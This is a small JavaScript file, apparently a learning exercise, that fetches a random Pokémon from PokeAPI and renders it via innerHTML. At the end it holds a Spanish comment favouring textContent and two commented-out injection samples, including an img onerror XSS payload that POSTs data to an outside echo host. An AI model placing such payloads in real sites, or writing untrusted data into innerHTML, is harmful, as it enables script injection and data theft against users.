let id = '';

function catchPokemon() {
    randomPokemon();
    const url = `https://pokeapi.co/api/v2/pokemon/${id}`;
    fetch(url)
    .then (response => response.json())
    .then (data => {   
        
    const namePokemon = data.name;

    document.getElementById("capturado").innerHTML = "Has capturado un: ";
    document.getElementById('pokemonImage').src = data.sprites.front_default;
    debugger;
    document.getElementById('pokemonName').innerHTML = data.name;
    
    document.getElementById("id").innerHTML = "# " + data.id;
    
    })
    console.log(id);
}

function randomPokemon(){
    id = Math.round(Math.random() * 905) + 1;
}


 //No poner innerHTML mejor textContent
/* data.name.innerHTML = 'function pepe() {console.log("HAHAHA maligno???");console.log("¿Creeis que maligno entrará en nuestra web?")}; pepe()' */

 // data.bug = `<img src='x' onerror='fetch("https://reqbin.com/echo/post/json", { method: "POST", body: JSON.stringify({userData: "HA HA HA, has been hacked", mode: "no-cors"}) })'>`












 